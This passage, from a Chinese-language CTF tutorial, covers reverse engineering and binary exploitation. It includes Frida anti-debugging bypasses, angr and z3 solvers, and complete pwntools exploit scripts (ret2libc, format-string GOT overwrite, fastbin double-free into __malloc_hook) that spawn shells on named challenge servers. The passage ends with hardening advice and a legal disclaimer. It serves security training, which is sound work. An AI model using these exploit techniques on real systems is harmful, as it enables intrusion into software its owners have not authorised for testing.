    # 标准Base64解码
    import base64
    return base64.b64decode(standard)

# z3求解器用于约束求解
from z3 import *

def solve_with_z3():
    """使用z3求解器自动求解"""
    s = Solver()
    
    # 定义Flag变量
    flag = [BitVec(f'f_{i}', 8) for i in range(32)]
    
    # 添加约束条件（从逆向分析得到）
    for i in range(32):
        s.add(flag[i] >= 32)  # 可打印字符
        s.add(flag[i] <= 126)
    
    # 添加加密约束
    s.add(flag[0] ^ 0x42 == 0x67)
    s.add(flag[1] ^ 0x42 == 0x65)
    # ... 更多约束
    
    if s.check() == sat:
        m = s.model()
        result = ''.join(chr(m[flag[i]].as_long()) for i in range(32))
        return result
    return None
```

### 7.4 UPX脱壳

```bash
# UPX是最常见的加壳工具，CTF中经常遇到

# 方法1: 使用UPX工具直接脱壳
upx -d ./packed_binary

# 方法2: 手动脱壳（当UPX被修改时）
# 1. 在入口点（OEP）下断
# 2. 运行到UPX解压完成
# 3. dump内存
# 4. 修复IAT（导入表）

# GDB手动脱壳:
gdb ./packed_binary
# 在_start下断
b _start
run
# UPX解压后跳转到OEP
# 观察跳转指令 → OEP地址
# dump内存
dump memory dumped.bin 0x400000 0x410000
```

---

## 八、混淆对抗

### 8.1 反调试

```python
# 常见反调试技术及绕过方法

anti_debug_techniques = {
    # 1. ptrace检测
    "ptrace": {
        "原理": "程序自己ptrace自己，成功说明没有调试器",
        "绕过": "修改ptrace返回值或使用LD_PRELOAD hook",
    },
    # 2. 时间检测
    "timing": {
        "原理": "检查代码执行时间，被调试时时间变长",
        "绕过": "修改rdtsc返回值或patch比较指令",
    },
    # 3. 文件检测
    "/proc/status": {
        "原理": "读取/proc/self/status的TracerPid字段",
        "绕过": "hook open/read或修改返回内容",
    },
    # 4. INT3检测
    "int3": {
        "原理": "检查代码段是否有INT3(0xCC)断点",
        "绕过": "使用硬件断点而非软件断点",
    },
    # 5. 调试器检测
    "is debugger present": {
        "原理": "调用IsDebuggerPresent API",
        "绕过": "修改返回值为0",
    },
}

# Frida绕过反调试
"""
// Frida脚本 - 绕过ptrace反调试
Interceptor.attach(Module.findExportByName(null, 'ptrace'), {
    onEnter: function(args) {
        // 修改参数为0（PTRACE_TRACEME = 0）
        args[0] = ptr(0);
    },
    onLeave: function(retval) {
        // 返回0表示成功
        retval.replace(0);
    }
});

// 绕过IsDebuggerPresent
Interceptor.attach(Module.findExportByName(null, 'IsDebuggerPresent'), {
    onLeave: function(retval) {
        retval.replace(0);
    }
});
"""
```

### 8.2 控制流平坦化

```python
# 控制流平坦化(Control Flow Flattening)
# 原理: 将正常的控制流打乱，使用一个调度器分发

# 原始代码:
"""
if (x == 1) {
    funcA();
} else if (x == 2) {
    funcB();
} else {
    funcC();
}
"""

# 平坦化后:
"""
while (state != EXIT) {
    switch (state) {
        case 0x1234:  // funcA的标签
            funcA();
            state = next_state;
            break;
        case 0x5678:  // funcB的标签
            funcB();
            state = next_state;
            break;
        case 0x9abc:  // funcC的标签
            funcC();
            state = next_state;
            break;
    }
}
"""

# 对抗方法:
# 1. 使用deflat工具去平坦化
#    https://github.com/SsageTrick/deflat
# 2. 使用angr符号执行跟踪路径
# 3. 动态调试跟踪实际执行路径

# angr去平坦化示例:
import angr

# 加载二进制
proj = angr.Project('./flattened_binary', auto_load_libs=False)
# 创建状态
state = proj.factory.entry_state()
# 创建模拟管理器
simgr = proj.factory.simulation_manager(state)
# 运行直到找到满足条件的状态
simgr.explore(find=lambda s: b'Correct' in s.posix.dumps(1))
# 获取解
if simgr.found:
    found = simgr.found[0]
    print(found.posix.dumps(0))  # 输入
```

### 8.3 VM混淆

```python
# VM混淆(Virtual Machine Obfuscation)
# 原理: 将原始代码转换为自定义虚拟机的字节码

# 分析VM混淆的步骤:
# 1. 找到VM dispatcher（通常是switch-case循环）
# 2. 分析每个handler对应的操作
# 3. 编写反汇编器将字节码转换回伪代码
# 4. 理解程序逻辑

# VM混淆结构:
"""
while (1) {
    opcode = code[pc++];
    switch (opcode) {
        case 0x01:  // push
            stack[sp++] = code[pc++];
            break;
        case 0x02:  // add
            stack[sp-2] += stack[sp-1];
            sp--;
            break;
        case 0x03:  // xor
            stack[sp-2] ^= stack[sp-1];
            sp--;
            break;
        case 0x04:  // jmp
            pc = code[pc];
            break;
        case 0x05:  // cmp
            flag = (stack[sp-2] == stack[sp-1]);
            sp -= 2;
            break;
        // ... 更多handler
    }
}
"""

# 使用angr符号执行自动求解:
import angr
import claripy

proj = angr.Project('./vm_binary', auto_load_libs=False)

# 创建符号输入
flag_len = 32
flag = claripy.BVS('flag', 8 * flag_len)

# 设置初始状态
state = proj.factory.entry_state(stdin=angr.SimFileStream)
for i in range(flag_len):
    byte = flag.get_byte(i)
    state.solver.add(byte >= 32)
    state.solver.add(byte <= 126)

# 运行
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=lambda s: b'Correct' in s.posix.dumps(1))

if simgr.found:
    solution = simgr.found[0].solver.eval(flag, cast_to=bytes)
    print(f"Flag: {solution.decode()}")
```

### 8.4 angr符号执行

```python
import angr
import claripy

# angr是强大的符号执行框架，适合自动化逆向

# 基本使用流程:
def angr_solve(binary_path, find_addr=None, avoid_addr=None, stdin_size=32):
    """使用angr自动求解"""
    
    # 1. 创建项目
    proj = angr.Project(binary_path, auto_load_libs=False)
    
    # 2. 创建初始状态
    state = proj.factory.entry_state()
    
    # 3. 设置输入约束（如果需要）
    for i in range(stdin_size):
        byte = state.posix.stdin.load(i, 1)
        state.solver.add(byte >= 0x20)
        state.solver.add(byte <= 0x7e)
    
    # 4. 创建模拟管理器
    simgr = proj.factory.simulation_manager(state)
    
    # 5. 探索
    if find_addr and avoid_addr:
        simgr.explore(find=find_addr, avoid=avoid_addr)
    elif find_addr:
        simgr.explore(find=find_addr)
    else:
        # 根据输出字符串查找
        simgr.explore(find=lambda s: b'Correct' in s.posix.dumps(1),
                      avoid=lambda s: b'Wrong' in s.posix.dumps(1))
    
    # 6. 提取结果
    if simgr.found:
        found_state = simgr.found[0]
        solution = found_state.posix.dumps(0)
        return solution
    return None

# 使用示例
result = angr_solve('./crackme')
if result:
    print(f"[+] 找到解: {result}")
else:
    print("[-] 未找到解")
```

---

## 九、实战案例

### 案例1：ret2libc - BUUCTF [BJDCTF 2nd]r2t3

```python
from pwn import *

context(arch='amd64', os='linux')

# 题目分析:
# 1. 64位ELF
# 2. NX开启, 无PIE
# 3. 存在栈溢出
# 4. 有puts函数可泄露libc

elf = ELF('./r2t3')
p = remote('node4.buuoj.cn', 29601)

# 找到gadget
pop_rdi_ret = 0x400933  # ROPgadget查找

# 第一段: 泄露puts地址
payload = b'A' * 0x20 + b'B' * 8  # 填充+saved rbp
payload += p64(pop_rdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.sendline(payload)

# 泄露地址
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
libc = ELF('./libc-2.27.so')
libc_base = puts_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

# 第二段: getshell
payload2 = b'A' * 0x20 + b'B' * 8
payload2 += p64(pop_rdi_ret + 1)  # ret对齐
payload2 += p64(pop_rdi_ret)
payload2 += p64(binsh)
payload2 += p64(system)

p.sendline(payload2)
p.interactive()
```

### 案例2：格式化字符串 - BUUCTF [Harekaze]fmt

```python
from pwn import *

context(arch='amd64', os='linux')

# 题目分析:
# 1. 格式化字符串漏洞
# 2. 格式化字符串在栈上
# 3. 偏移为8

p = remote('node4.buuoj.cn', 29559)
elf = ELF('./fmt')

# 确定偏移
p.sendline(b'%9$p')
# 输出确认偏移

# 泄露栈地址
p.sendline(b'%p.%p.%p.%p.%p.%p.%p.%p')
# 分析输出找到栈地址

# 利用fmtstr_payload修改got表
# 将printf的got改为system
printf_got = elf.got['printf']
system_addr = 0x401234  # 如果system在程序中

# 使用pwntools的fmtstr_payload
payload = fmtstr_payload(8, {printf_got: system_addr}, write_size='short')
p.sendline(payload)

# 再次输入/bin/sh触发system
p.sendline(b'/bin/sh\x00')
p.interactive()
```

### 案例3：堆利用 - fastbin dup

```python
from pwn import *

context(arch='amd64', os='linux')

# 题目分析:
# 1. 菜单: add, delete, show
# 2. 限制size为0x60（fastbin范围）
# 3. 无double free检查

p = remote('ctf.example.com', 9999)
libc = ELF('./libc-2.23.so')

def add(size, data):
    p.sendlineafter(b'choice:', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendafter(b'content:', data)

def free(idx):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'index:', str(idx).encode())

def show(idx):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'index:', str(idx).encode())

# 1. 泄露libc
add(0x60, b'A' * 8)  # 0
add(0x60, b'B' * 8)  # 1
add(0x60, b'C' * 8)  # 2 - 防止与top合并
free(1)
# 利用其他漏洞泄露libc地址
# ... 省略泄露部分
libc_base = leaked_addr - libc.symbols['__malloc_hook'] - 0x10

# 2. fastbin dup
free(0)
free(1)
free(0)  # double free

# 3. 覆盖fd
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0x45226  # one_gadget地址

add(0x60, p64(malloc_hook - 0x23))  # 修改fd指向fake chunk
add(0x60, b'filler')
add(0x60, b'filler')
add(0x60, b'A' * 0x13 + p64(one_gadget))  # 写入one_gadget

# 4. 触发
p.sendlineafter(b'choice:', b'1')
p.sendlineafter(b'size:', b'32')
p.interactive()
```

### 案例4：逆向 - 攻防世界 re1

```python
# 题目分析:
# 1. Windows PE程序
# 2. 输入字符串，与加密后的Flag比较
# 3. 使用IDA静态分析

# IDA分析结果:
"""
关键代码:
v5 = 0;
while (v5 < strlen(input)) {
    if (v5 & 1)
        input[v5] -= 2;  // 奇数位: 减2
    else
        input[v5] += 5;  // 偶数位: 加5
    v5++;
}
if (strcmp(input, target) == 0) {
    printf("Correct");
}
"""

# 逆向解密:
target = "kinds_of_char_here"  # 从程序中提取的加密后字符串

def decrypt(encrypted):
    result = list(encrypted)
    for i in range(len(result)):
        c = ord(result[i])
        if i & 1:
            c += 2  # 奇数位逆向: 加2
        else:
            c -= 5  # 偶数位逆向: 减5
        result[i] = chr(c)
    return ''.join(result)

flag = decrypt(target)
print(f"[+] Flag: flag{{{flag}}}")
```

### 案例5：UPX脱壳逆向

```bash
# 题目分析:
# 1. Linux ELF文件
# 2. 被UPX加壳
# 3. file命令显示: UPX compressed

# 步骤1: 尝试直接脱壳
upx -d ./crackme
# 成功: File size ratio, OK

# 步骤2: 如果UPX被修改，手动脱壳
gdb ./crackme
# 在入口点下断
# UPX入口通常是 pusha/mov ebp,esp
# 运行到OEP（原始入口点）
# UPX解压完成后会有一个大的jmp到OEP
# dump内存并修复

# 步骤3: 分析脱壳后的程序
# 使用IDA打开脱壳后的程序
# 找到main函数
# 分析Flag校验逻辑
# 编写逆向脚本
```

```python
# 脱壳后分析 - 简单异或加密
def solve():
    # 从程序中提取的加密Flag
    encrypted = [0x1e, 0x1a, 0x0d, 0x15, 0x46, 0x1e, 0x1a, 0x0d]
    
    # 异或密钥（从逆向分析得到）
    key = 0x42
    
    flag = ''.join(chr(b ^ key) for b in encrypted)
    print(f"[+] Flag: {flag}")

solve()
```

---

## 十、安全最佳实践

### 10.1 二进制安全防御

```c
// 安全的C代码示例

// 1. 使用安全函数替代不安全函数
// ❌ 危险: gets, strcpy, sprintf
// ✅ 安全: fgets, strncpy, snprintf

void safe_function() {
    char buf[64];
    // 使用fgets限制读取长度
    fgets(buf, sizeof(buf), stdin);
    // 使用snprintf限制写入长度
    snprintf(buf, sizeof(buf), "%s", input);
}

// 2. 栈保护
// 编译时加 -fstack-protector-all
// 添加Canary保护

// 3. 编译选项
// gcc -o binary source.c \
//     -fstack-protector-all  \  // Canary
//     -pie -fPIE             \  // PIE
//     -Wl,-z,relro,-z,now   \  // Full RELRO
//     -Wl,-z,noexecstack      // NX
```

### 10.2 安全编码建议

```python
# Python安全建议
security_tips = {
    "输入验证": "对所有输入进行严格验证和长度限制",
    "边界检查": "所有缓冲区操作必须有边界检查",
    "最小权限": "程序以最小权限运行",
    "安全函数": "使用安全函数替代不安全函数",
    "编译保护": "启用所有可用的编译保护选项",
    "内存安全": "使用内存安全语言（Rust）或安全库",
    "漏洞扫描": "使用工具定期扫描二进制漏洞",
}
```

### 10.3 学习建议

```
PWN学习路线:
1. 熟悉Linux操作和GDB调试
2. 学习C语言和汇编基础
3. 理解ELF文件格式和内存布局
4. 掌握pwntools基本使用
5. 从ret2text开始练习栈溢出
6. 逐步学习ret2libc、ROP、格式化字符串
7. 进阶堆利用（fastbin→tcache→house of）
8. 挑战内核PWN

逆向学习路线:
1. 学习x86/x64汇编
2. 熟练使用IDA Pro/Ghidra
3. 从简单算法逆向开始
4. 学习动态调试技术
5. 掌握脱壳技术
6. 学习混淆对抗和符号执行
```

---

> **安全提示**：PWN和逆向技术仅用于CTF竞赛和安全研究。未经授权对软件进行逆向或攻击系统属于违法行为。请始终在授权环境中练习，遵守相关法律法规。
